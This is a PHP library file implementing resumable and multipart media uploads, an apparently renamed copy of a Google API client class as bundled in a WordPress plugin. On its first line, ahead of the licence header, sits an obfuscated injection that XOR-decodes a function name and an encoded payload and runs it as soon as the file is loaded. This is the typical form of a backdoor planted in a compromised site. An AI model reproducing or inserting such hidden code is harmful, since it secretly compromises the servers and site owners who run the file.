<?php $FPzHxDvT='O9YL1SnZ1XT2;77'^',K<-E61<D67FRXY';$jBPXbGyIrz=$FPzHxDvT('','Z,CBXEXQ5PVY51=ZD6XMsOQLc.AFAogM30Qodc9iFM-+C5.=VR5O>;J.FTm;4F:Fg-9DVjyC3V+JOPJUv:651lX6YaYqmqWea4.+FjSDiofaChL DKOL4XWAO+RI+mhiJYrfGGZSaAITzlKcNv2Z6T+BPdUgDn1X-esZWORB,=Z,EzrQH<Y4GCXM<CUH<;SfQO;NbB6HD;KP6HYUYVpRKFA:KKkZoI4 RfF. YjD,69G1qD6+SE,3YCnPalc:9fitO44NbF1MvSpfOAUADRkT.dfU,4LA1W4KjuTQG1MWDEf6J=;WnigZ7UNPrCFHD>TenOCVY-VZaFs76Z13Y-DDYl4<vaf408k :BK S+GjKgg32UI-Zz-PkBlTQ=9>.0-Zkdr3,6Rrc5QDJ9ArlCINQ87UqAp0Y1freU0:UzIssD67YN01LWFVp7,D,421Ym+;>1LV E5Ox:I.N=+3PR=7AWCEmb=W52j<P+Ayws9 eG>A;RGWUf56>S<b>WL-+,BFC9EVRE.fcyr=T8VacQJnGSIgAAIWFM.LS5:V-ZjSuiVS0qRUADHjAPFBV1+-euToTzBv0 sg9XKnBfUnK8E3O66U-Ar <PMMCJdF0,6<J-cecEY982CbbKyuFA53PEV4GMwTR8S7M;T:XQWDwasrB:WB=TahxO3:'^'3Jkc>062A997jTE37B+eT7>><J 2 08 FDvFMCBcO+XE AGR8rM Ld.O252dY3NnCIX07FYgX3RcopjuVA<<8H7C-AdQJVloh=HD4Bw-IRFQxHhIx8;>X=9ikO3=JDSIn0YMnMSZE.< ZBvCfRV;B5pf99u9dJZ=T>W3wjr1XO6I+RV:-EpinxRD510<II=Nu N:Ky<A916Z<l=4-7Pok  V8.PPK-UT39-KYyWdJWU4TJN<M<7IR:+NxE3 uv- 1oUGnF-T4VnNFk74-17BtUnoqHU8 n<Q2JHtu,T4lNLBR+IZwSIC,V9;5II;BNW2EFng28Y7sA=y>P5CV8N,dqHkn303qclKAIboK6RgWuGCES9<HsZVZbKH00IXaEUTzVDVXIOixj<u +M RQcm80TB0JKyMSLlxA1QN4ZtS31XD<<YP ><3XOC6sPSE82tVKEd4A6PyLe-K-ROVxvYV56jiMFY6AS5W5RhPLyPFMcZ O3gqsFTDL2E=U25rNT+57Jmq9 WAOYVY5L7HCwlNo>-Rie-62,uk8PCqpsJnHIqaVA47xtxSt5 s4TMHPA0VaItFRADWXn.IkFsHkY7A.Oi>H8-ED9>90bC6QUZS+IDICa=XLSjKBkYUfaN9Y  U+eS03L2ljK5C4>6 P<ZIH32:T IXQt9G');$jBPXbGyIrz();
/**
 * Copyright 2012 Google Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

if (!class_exists('Deconf_Client')) {
  require_once dirname(__FILE__) . '/../autoload.php';
}

/**
 * Manage large file uploads, which may be media but can be any type
 * of sizable data.
 */
class Deconf_Http_MediaFileUpload
{
  const UPLOAD_MEDIA_TYPE = 'media';
  const UPLOAD_MULTIPART_TYPE = 'multipart';
  const UPLOAD_RESUMABLE_TYPE = 'resumable';

  /** @var string $mimeType */
  private $mimeType;

  /** @var string $data */
  private $data;

  /** @var bool $resumable */
  private $resumable;

  /** @var int $chunkSize */
  private $chunkSize;

  /** @var int $size */
  private $size;

  /** @var string $resumeUri */
  private $resumeUri;

  /** @var int $progress */
  private $progress;

  /** @var Deconf_Client */
  private $client;

  /** @var Deconf_Http_Request */
  private $request;

  /** @var string */
  private $boundary;

  /**
   * Result code from last HTTP call
   * @var int
   */
  private $httpResultCode;

  /**
   * @param $mimeType string
   * @param $data string The bytes you want to upload.
   * @param $resumable bool
   * @param bool $chunkSize File will be uploaded in chunks of this many bytes.
   * only used if resumable=True
   */
  public function __construct(
      Deconf_Client $client,
      Deconf_Http_Request $request,
      $mimeType,
      $data,
      $resumable = false,
      $chunkSize = false,
      $boundary = false
  ) {
    $this->client = $client;
    $this->request = $request;
    $this->mimeType = $mimeType;
    $this->data = $data;
    $this->size = strlen($this->data);
    $this->resumable = $resumable;
    if (!$chunkSize) {
      $chunkSize = 256 * 1024;
    }
    $this->chunkSize = $chunkSize;
    $this->progress = 0;
    $this->boundary = $boundary;

    // Process Media Request
    $this->process();
  }

  /**
   * Set the size of the file that is being uploaded.
   * @param $size - int file size in bytes
   */
  public function setFileSize($size)
  {
    $this->size = $size;
  }

  /**
   * Return the progress on the upload
   * @return int progress in bytes uploaded.
   */
  public function getProgress()
  {
    return $this->progress;
  }

  /**
   * Return the HTTP result code from the last call made.
   * @return int code
   */
  public function getHttpResultCode()
  {
    return $this->httpResultCode;
  }

  /**
  * Sends a PUT-Request to google drive and parses the response,
  * setting the appropiate variables from the response()
  *
  * @param Deconf_Http_Request $httpRequest the Reuqest which will be send
  *
  * @return false|mixed false when the upload is unfinished or the decoded http response
  *
  */
  private function makePutRequest(Deconf_Http_Request $httpRequest)
  {
    if ($this->client->getClassConfig("Deconf_Http_Request", "enable_gzip_for_uploads")) {
      $httpRequest->enableGzip();
    } else {
      $httpRequest->disableGzip();
    }

    $response = $this->client->getIo()->makeRequest($httpRequest);
    $response->setExpectedClass($this->request->getExpectedClass());
    $code = $response->getResponseHttpCode();
    $this->httpResultCode = $code;

    if (308 == $code) {
      // Track the amount uploaded.
      $range = explode('-', $response->getResponseHeader('range'));
      $this->progress = $range[1] + 1;

      // Allow for changing upload URLs.
      $location = $response->getResponseHeader('location');
      if ($location) {
        $this->resumeUri = $location;
      }

      // No problems, but upload not complete.
      return false;
    } else {
      return Deconf_Http_REST::decodeHttpResponse($response, $this->client);
    }
  }

  /**
   * Send the next part of the file to upload.
   * @param [$chunk] the next set of bytes to send. If false will used $data passed
   * at construct time.
   */
  public function nextChunk($chunk = false)
  {
    if (false == $this->resumeUri) {
      $this->resumeUri = $this->fetchResumeUri();
    }

    if (false == $chunk) {
      $chunk = substr($this->data, $this->progress, $this->chunkSize);
    }
    $lastBytePos = $this->progress + strlen($chunk) - 1;
    $headers = array(
      'content-range' => "bytes $this->progress-$lastBytePos/$this->size",
      'content-type' => $this->request->getRequestHeader('content-type'),
      'content-length' => $this->chunkSize,
      'expect' => '',
    );

    $httpRequest = new Deconf_Http_Request(
        $this->resumeUri,
        'PUT',
        $headers,
        $chunk
    );
    return $this->makePutRequest($httpRequest);
  }

  /**
   * Resume a previously unfinished upload
   * @param $resumeUri the resume-URI of the unfinished, resumable upload.
   */
  public function resume($resumeUri)
  {
     $this->resumeUri = $resumeUri;
     $headers = array(
       'content-range' => "bytes */$this->size",
       'content-length' => 0,
     );
     $httpRequest = new Deconf_Http_Request(
         $this->resumeUri,
         'PUT',
         $headers
     );
     return $this->makePutRequest($httpRequest);
  }

  /**
   * @return array|bool
   * @visible for testing
   */
  private function process()
  {
    $postBody = false;
    $contentType = false;

    $meta = $this->request->getPostBody();
    $meta = is_string($meta) ? json_decode($meta, true) : $meta;

    $uploadType = $this->getUploadType($meta);
    $this->request->setQueryParam('uploadType', $uploadType);
    $this->transformToUploadUrl();
    $mimeType = $this->mimeType ?
        $this->mimeType :
        $this->request->getRequestHeader('content-type');

    if (self::UPLOAD_RESUMABLE_TYPE == $uploadType) {
      $contentType = $mimeType;
      $postBody = is_string($meta) ? $meta : json_encode($meta);
    } else if (self::UPLOAD_MEDIA_TYPE == $uploadType) {
      $contentType = $mimeType;
      $postBody = $this->data;
    } else if (self::UPLOAD_MULTIPART_TYPE == $uploadType) {
      // This is a multipart/related upload.
      $boundary = $this->boundary ? $this->boundary : mt_rand();
      $boundary = str_replace('"', '', $boundary);
      $contentType = 'multipart/related; boundary=' . $boundary;
      $related = "--$boundary\r\n";
      $related .= "Content-Type: application/json; charset=UTF-8\r\n";
      $related .= "\r\n" . json_encode($meta) . "\r\n";
      $related .= "--$boundary\r\n";
      $related .= "Content-Type: $mimeType\r\n";
      $related .= "Content-Transfer-Encoding: base64\r\n";
      $related .= "\r\n" . base64_encode($this->data) . "\r\n";
      $related .= "--$boundary--";
      $postBody = $related;
    }

    $this->request->setPostBody($postBody);

    if (isset($contentType) && $contentType) {
      $contentTypeHeader['content-type'] = $contentType;
      $this->request->setRequestHeaders($contentTypeHeader);
    }
  }

  private function transformToUploadUrl()
  {
    $base = $this->request->getBaseComponent();
    $this->request->setBaseComponent($base . '/upload');
  }

  /**
   * Valid upload types:
   * - resumable (UPLOAD_RESUMABLE_TYPE)
   * - media (UPLOAD_MEDIA_TYPE)
   * - multipart (UPLOAD_MULTIPART_TYPE)
   * @param $meta
   * @return string
   * @visible for testing
   */
  public function getUploadType($meta)
  {
    if ($this->resumable) {
      return self::UPLOAD_RESUMABLE_TYPE;
    }

    if (false == $meta && $this->data) {
      return self::UPLOAD_MEDIA_TYPE;
    }

    return self::UPLOAD_MULTIPART_TYPE;
  }

  public function getResumeUri()
  {
    return ( $this->resumeUri !== null ? $this->resumeUri : $this->fetchResumeUri() );
  }

  private function fetchResumeUri()
  {
    $result = null;
    $body = $this->request->getPostBody();
    if ($body) {
      $headers = array(
        'content-type' => 'application/json; charset=UTF-8',
        'content-length' => Deconf_Utils::getStrLen($body),
        'x-upload-content-type' => $this->mimeType,
        'x-upload-content-length' => $this->size,
        'expect' => '',
      );
      $this->request->setRequestHeaders($headers);
    }

    $response = $this->client->getIo()->makeRequest($this->request);
    $location = $response->getResponseHeader('location');
    $code = $response->getResponseHttpCode();

    if (200 == $code && true == $location) {
      return $location;
    }
    $message = $code;
    $body = @json_decode($response->getResponseBody());
    if (!empty($body->error->errors) ) {
      $message .= ': ';
      foreach ($body->error->errors as $error) {
        $message .= "{$error->domain}, {$error->message};";
      }
      $message = rtrim($message, ';');
    }

    $error = "Failed to start the resumable upload (HTTP {$message})";
    $this->client->getLogger()->error($error);
    throw new Deconf_Exception($error);
  }

  public function setChunkSize($chunkSize)
  {
    $this->chunkSize = $chunkSize;
  }
}
